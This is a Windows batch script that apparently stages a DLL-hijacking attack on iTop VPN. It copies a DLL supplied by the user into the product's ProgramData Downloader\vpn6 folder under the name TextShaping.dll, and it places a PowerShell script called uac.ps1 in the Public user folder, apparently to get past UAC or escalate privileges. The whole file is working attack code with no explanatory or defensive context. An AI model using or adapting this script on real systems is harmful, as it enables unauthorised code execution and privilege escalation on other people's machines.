@echo off
setlocal

:: Define the target directories
set "dllTargetDir=C:\ProgramData\iTop VPN\Downloader\vpn6"
set "psTargetDir=C:\Users\Public"

:: Check if the first argument (DLL file) is provided
if "%~1"=="" (
    echo Error: No DLL file provided.
    echo Usage: %0 YourDLLFile.dll
    exit /b 1
)

:: Check if the DLL file exists
if not exist "%~1" (
    echo Error: DLL file "%~1" not found.
    exit /b 1
)
:: Check if the Downloader directory exists; if not, create it
set "downloaderDir=C:\ProgramData\iTop VPN\Downloader"
if not exist "%downloaderDir%" (
    echo Creating Downloader directory...
    mkdir "%downloaderDir%"
)

:: Check if the vpn6 directory exists inside Downloader; if not, create it
if not exist "%dllTargetDir%" (
    echo Creating vpn6 directory...
    mkdir "%dllTargetDir%"
)

:: Get the full path of the provided DLL file
set "dllFile=%~1"

:: Copy the DLL file to the target directory
echo Copying DLL file to %dllTargetDir%...
copy "%dllFile%" "%dllTargetDir%\TextShaping.dll" /y
if %errorlevel% neq 0 (
    echo Error: Failed to copy the DLL file.
    exit /b %errorlevel%
)

:: Define the name of the hardcoded PowerShell script
set "psScriptName=uac.ps1"

:: Check if the PowerShell script exists in the same directory as this batch file
if not exist "%~dp0%psScriptName%" (
    echo Error: PowerShell script "%psScriptName%" not found in "%~dp0".
    exit /b 1
)

:: Copy the PowerShell script to the target directory
echo Copying PowerShell script to %psTargetDir%...
xcopy "%~dp0%psScriptName%" "%psTargetDir%" /y /i
if %errorlevel% neq 0 (
    echo Error: Failed to copy the PowerShell script.
    exit /b %errorlevel%
)

echo Files copied successfully.
endlocal
exit /b 0
